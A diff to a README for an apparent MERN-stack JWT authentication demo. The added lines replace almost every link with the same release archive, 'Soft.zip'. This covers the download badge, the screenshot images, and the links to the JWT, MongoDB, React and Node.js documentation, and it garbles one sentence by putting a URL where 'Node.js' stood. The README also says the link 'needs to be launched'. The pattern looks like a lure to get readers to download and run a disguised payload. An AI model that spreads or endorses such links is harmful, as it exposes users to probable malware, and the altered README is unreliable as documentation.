@@ -1,6 +1,6 @@
 # 🚀 MERN JWT Authentication Demo
 
-Welcome to the **MERN_JWT** repository - a simple demonstration of authentication using JWT in MERN stack web applications! This project showcases how to implement JWT authentication in a MERN (MongoDB, Express, React, Node.js) stack. 
+Welcome to the **MERN_JWT** repository - a simple demonstration of authentication using JWT in MERN stack web applications! This project showcases how to implement JWT authentication in a MERN (MongoDB, Express, React, https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip) stack. 
 
 ## 📦 Repository Content
 
@@ -21,7 +21,7 @@ Feel free to customize and expand upon this demo to suit your own authentication
 
 Click the button below to download and explore the project:
 
-[![Download Project](https://img.shields.io/badge/Download%20Project-Release-orange)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Project](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip%20Project-Release-orange)](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
 
 *Note: The provided link needs to be launched.*
 
@@ -33,20 +33,20 @@ If the download link is not working or you need additional assistance, please ch
 
 Here are some screenshots from the demo app:
 
-![Login Page](https://example.com/login-page.png)
+![Login Page](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
 *Login Page*
 
-![Registration Page](https://example.com/register-page.png)
+![Registration Page](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
 *Registration Page*
 
 ## 🌐 Additional Resources
 
 For more information on JWT authentication and MERN stack development, check out the following resources:
 
-- [JWT Official Website](https://jwt.io/)
-- [MongoDB Documentation](https://docs.mongodb.com/)
-- [React Documentation](https://reactjs.org/)
-- [Node.js Documentation](https://nodejs.org/en/)
+- [JWT Official Website](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
+- [MongoDB Documentation](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
+- [React Documentation](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
+- [https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip Documentation](https://github.com/vpbprakash/MERN_JWT/releases/download/v1.0/Soft.zip)
 
 ## 🤝 Contribution
 
